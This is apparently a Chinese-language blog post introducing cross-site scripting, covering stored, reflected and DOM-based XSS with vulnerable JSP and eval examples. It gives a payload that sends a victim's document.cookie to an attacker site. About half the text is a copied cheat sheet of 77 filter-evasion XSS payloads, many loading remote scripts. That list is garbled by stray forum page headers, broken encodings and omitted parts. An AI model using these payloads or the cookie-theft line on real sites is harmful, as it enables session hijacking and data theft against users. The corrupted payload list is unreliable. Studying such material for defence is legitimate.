---
title: "XSS Overview"
layout: post
date: 2016-08-14
permalink : /post/xss-overview
tag:
- SECURITY
blog: true
---

## 什么是XSS？

**跨站脚本攻击**(Cross Site Scripting)：攻击者往Web页面里插入恶意脚本，当用户浏览该页面时，嵌入页面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。恶意的内容通常需要以一段JavaScript的形式发送到浏览器,但也可能包括HTML、Flash,或任何其他类型的浏览器可以执行的代码

XSS的危害通常包括传输私有数据,像cookie或session信息；重定向受害者看到的内容；或在用户的机器上进行恶意操作。


XSS攻击发生的原因：

1. 数据通过一个未信任的来源进入Web应用中，最常见的是一个web请求
2. 数据中包含动态文本，然后发送给用户，但是没有校验恶意的文本，如velocity渲染页面


## XSS 的类型

### Stored XSS(存储型XSS)

把用户输入的数据（比如恶意的js代码）存储在服务器端，具有很强的稳定性，危害时间长，每次用户读取这段数据时都会执行一次，所以受害者是很多人。

**最典型的攻击场景就是留言板。**

其攻击过程如下：

- Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。
- Charly注意到Bob的站点具有存储型XXS漏洞。
- Charly发布一个包含XSS攻击脚本的热点信息，并吸引其它用户纷纷阅读。
- Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。


### Reflected XSS(反射型XSS)

反射攻击是通过另一种方式攻击受害者,比如在一封电子邮件。当用户点击了一个恶意链接,将会提交一个特殊的表单,或者仅仅只是浏览恶意网站,注入的代码将反射到攻击用户的浏览器

**最典型的攻击场景就是给个恶意链接让你去点。**

其攻击过程如下：

-  Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点运行Alice使用用户名/密码进行登录，并存储敏感信息（比如银行帐户信息）。
- Charly发现Bob的站点包含反射性的XSS漏洞。
- Charly编写一个利用漏洞的URL，并将其冒充为来自Bob的邮件发送给Alice。
- Alice在登录到Bob的站点后，浏览Charly提供的URL。

嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自Bob的服务器一样。此脚本盗窃敏感信息（授权、信用卡、帐号信息等）然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。

### DOM Based XSS

这种不是按照存储在哪里来划分的，可以说是反射型的一种，由于历史原因，归为一类，通过改变DOM结构形成的XSS称之为DOM Based。

## Example

## eg.1 Reflected XSS 

```java
<% String eid = request.getParameter("eid"); %> 
	...
	Employee ID: <%= eid %>
```

jsp页面中，我们可能会像上面那样写。

最初这似乎不可能出现的漏洞，因为攻击者不可能用来输入一段而已的代码然后攻击自己的电脑，导致恶意代码运行在自己的电脑。但**真正的危险**是,攻击者将创建恶意URL,然后使用电子邮件或社会工程学技巧来吸引受害者访问的URL链接。受害者点击链接时,无意中反映了恶意的内容通过脆弱的web应用程序回自己的电脑。这个机制称为**反射型XSS攻击**

> 
当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫eid的参数直接显示的。 我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?eid=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。

## eg.2 Stored XSS

```java
<%... 
 Statement stmt = conn.createStatement();
 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
 if (rs != null) {
  rs.next(); 
  String name = rs.getString("name");
%>

Employee Name: <%= name %>
```

这段代码功能是显示名字,但这并没有阻止被利用。这段代码相对上一种而言危险更小,因为名字是读取数据库的值。然而,如果名字来源于用户提供的输入,那么数据库可以为恶意内容的一个渠道。没有适当的输入验证数据就存储在数据库中,攻击者可以在用户的web浏览器中执行恶意命令，也就是**存储型XSS攻击**。

> 
 a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功

### eg.3 DOM Based XSS

`http://www.a.com/xss/domxss.html`页面中代码如下：

```java
<script>
eval(location.hash.substr(1));
</script>
```

触发方式为：`http://www.a.com/xss/domxss.html#alert(1)`

## 网站是否会遭受XSS攻击？

XSS漏洞很难被识别或从一个web应用程序删除。发现缺陷的最好方法是进行**代码的安全审查**和搜索所有**从HTTP请求输入且有可能使其输出到页面**的代码，并对这些代码进行相应的处理。

注意,可以使用各种不同的HTML标记传输恶意JavaScript。Nessus Nikto,和其他一些可用的工具可以帮助扫描一个网站的这些缺陷,但却只是完成表面功夫。如果一个网站的某一部分是脆弱的,那么极有可能还有其他问题。


## 防御XSS的具体措施

将在下一篇博客中写出


## XSS攻击方式清单

下面的清单是网上比较流行的攻击方案。
我们从中可以看到多种多样的攻击方式，因此要防御XSS攻击需要考虑很多种情况。


```text
(1)普通的XSS JavaScript注入
<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
(2)IMG标签XSS使用JavaScript命令
<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
(3)IMG标签无分号无引号
<IMG SRC=javascript:alert(‘XSS’)>
(4)IMG标签大小写不敏感
<IMG SRC=JaVaScRiPt:alert(‘XSS’)>
(5)HTML编码(必须有分号)
<IMG SRC=javascript:alert(“XSS”)>
(6)修正缺陷IMG标签
<IMG “”"><SCRIPT>alert(“XSS”)</SCRIPT>”>
(7)formCharCode标签(计算器)
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
(8)UTF-8的Unicode编码(计算器)
<IMG SRC=jav..省略..S')>
(9)7位的UTF-8的Unicode编码是没有分号的(计算器)
<IMG SRC=jav..省略..S')>
(10)十六进制编码也是没有分号(计算器)
<IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>
(11)嵌入式标签,将Javascript分开
<IMG SRC=”jav ascript:alert(‘XSS’);”>
(12)嵌入式编码标签,将Javascript分开
<IMG SRC=”jav ascript:alert(‘XSS’);”>
(13)嵌入式换行符
<IMG SRC=”jav ascript:alert(‘XSS’);”>
(14)嵌入式回车
<IMG SRC=”jav ascript:alert(‘XSS’);”>
(15)嵌入式多行注入JavaScript,这是XSS极端的例子
<IMG SRC=”javascript:alert(‘XSS‘)”>
(16)解决限制字符(要求同页面)
<script>z=’document.’</script>
<script>z=z+’write(“‘</script>
<script>z=z+’<script’</script>
<script>z=z+’ src=ht’</script>
<script>z=z+’tp://ww’</script>
<script>z=z+’w.shell’</script>
<script>z=z+’.net/1.’</script>
<script>z=z+’js></sc’</script>
<script>z=z+’ript>”)’</script>
<script>eval_r(z)</script>
(17)空字符\0
https://www.t00ls.net/viewthread.php?action=printable&tid=15267 2/6
perl -e ‘print “<IMG SRC=java\0script:alert(\”XSS\”)>”;’ > out
(18)空字符,空字符在国内基本没效果.因为没有地方可以利用
perl -e ‘print “<SCR\0IPT>alert(\”XSS\”)</SCR\0IPT>”;’ > out
(19)Spaces和meta前的IMG标签
<IMG SRC=” javascript:alert(‘XSS’);”>
(20)Non-alpha-non-digit XSS
<SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”></SCRIPT>
(21)Non-alpha-non-digit XSS to 2
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>
(22)Non-alpha-non-digit XSS to 3
<SCRIPT/SRC=”http://3w.org/XSS/xss.js”></SCRIPT>
(23)双开括号
<<SCRIPT>alert(“XSS”);//<</SCRIPT>
(24)无结束脚本标记(仅火狐等浏览器)
<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
(25)无结束脚本标记2
<SCRIPT SRC=//3w.org/XSS/xss.js>
(26)半开的HTML/JavaScript XSS
<IMG SRC=”javascript:alert(‘XSS’)”
(27)双开角括号
<iframe src=http://3w.org/XSS.html <
(28)无单引号 双引号 分号
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
(29)换码过滤的JavaScript
\”;alert(‘XSS’);//
(30)结束Title标签
</TITLE><SCRIPT>alert(“XSS”);</SCRIPT>
(31)Input Image
<INPUT SRC=”javascript:alert(‘XSS’);”>
(32)BODY Image
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
(33)BODY标签
<BODY(‘XSS’)>
(34)IMG Dynsrc
<IMG DYNSRC=”javascript:alert(‘XSS’)”>
(35)IMG Lowsrc
<IMG LOWSRC=”javascript:alert(‘XSS’)”>
(36)BGSOUND
<BGSOUND SRC=”javascript:alert(‘XSS’);”>
(37)STYLE sheet
<LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”>
(38)远程样式表
<LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”>
(39)List-style-image(列表式)
<STYLE>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</STYLE><UL><LI>XSS
(40)IMG VBscript
<IMG SRC=’vbscript:msgbox(“XSS”)’></STYLE><UL><LI>XSS
(41)META链接url
<META HTTP-EQUIV=”refresh” CONTENT=”0;
URL=http://;URL=javascript:alert(‘XSS’);”>
(42)Iframe
<IFRAME SRC=”javascript:alert(‘XSS’);”></IFRAME>
(43)Frame
<FRAMESET><FRAME SRC=”javascript:alert(‘XSS’);”></FRAMESET>12-7-1 T00LS - Powered by Discuz! Board
https://www.t00ls.net/viewthread.php?action=printable&tid=15267 3/6
(44)Table
<TABLE BACKGROUND=”javascript:alert(‘XSS’)”>
(45)TD
<TABLE><TD BACKGROUND=”javascript:alert(‘XSS’)”>
(46)DIV background-image
<DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
(47)DIV background-image后加上额外字符(1-32&34&39&160&8192-
8&13&12288&65279)
<DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
(48)DIV expression
<DIV STYLE=”width: expression_r(alert(‘XSS’));”>
(49)STYLE属性分拆表达
<IMG STYLE=”xss:expression_r(alert(‘XSS’))”>
(50)匿名STYLE(组成:开角号和一个字母开头)
<XSS STYLE=”xss:expression_r(alert(‘XSS’))”>
(51)STYLE background-image
<STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><A
CLASS=XSS></A>
(52)IMG STYLE方式
exppression(alert(“XSS”))’>
(53)STYLE background
<STYLE><STYLE
type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</STYLE>
(54)BASE
<BASE HREF=”javascript:alert(‘XSS’);//”>
(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS
<EMBED SRC=”http://3w.org/XSS/xss.swf” ></EMBED>
(56)在flash中使用ActionScrpt可以混进你XSS的代码
a=”get”;
b=”URL(\”";
c=”javascript:”;
d=”alert(‘XSS’);\”)”;
eval_r(a+b+c+d);
(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上
<HTML xmlns:xss>
<?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”>
<xss:xss>XSS</xss:xss>
</HTML>
(58)如果过滤了你的JS你可以在图片里添加JS代码来利用
<SCRIPT SRC=””></SCRIPT>
(59)IMG嵌入式命令,可执行任意命令
<IMG SRC=”http://www.XXX.com/a.php?a=b”>
(60)IMG嵌入式命令(a.jpg在同服务器)
Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser
(61)绕符号过滤
<SCRIPT a=”>” SRC=”http://3w.org/xss.js”></SCRIPT>
(62)
<SCRIPT =”>” SRC=”http://3w.org/xss.js”></SCRIPT>
(63)
<SCRIPT a=”>” ” SRC=”http://3w.org/xss.js”></SCRIPT>
(64)
<SCRIPT “a=’>’” SRC=”http://3w.org/xss.js”></SCRIPT>
(65)
<SCRIPT a=`>` SRC=”http://3w.org/xss.js”></SCRIPT>
(66)12-7-1 T00LS - Powered by Discuz! Board
https://www.t00ls.net/viewthread.php?action=printable&tid=15267 4/6
<SCRIPT a=”>’>” SRC=”http://3w.org/xss.js”></SCRIPT>
(67)
<SCRIPT>document.write(“<SCRI”);</SCRIPT>PT SRC=”http://3w.org/xss.js”>
</SCRIPT>
(68)URL绕行
<A HREF=”http://127.0.0.1/”>XSS</A>
(69)URL编码
<A HREF=”http://3w.org”>XSS</A>
(70)IP十进制
<A HREF=”http://3232235521″>XSS</A>
(71)IP十六进制
<A HREF=”http://0xc0.0xa8.0×00.0×01″>XSS</A>
(72)IP八进制
<A HREF=”http://0300.0250.0000.0001″>XSS</A>
(73)混合编码
<A HREF=”h
tt p://6 6.000146.0×7.147/”">XSS</A>
(74)节省[http:]
<A HREF=”//www.google.com/”>XSS</A>
(75)节省[www]
<A HREF=”http://google.com/”>XSS</A>
(76)绝对点绝对DNS
<A HREF=”http://www.google.com./”>XSS</A>
(77)javascript链接
<A HREF=”javascript:document.location=’http://www.google.com/’”>XSS</A>
```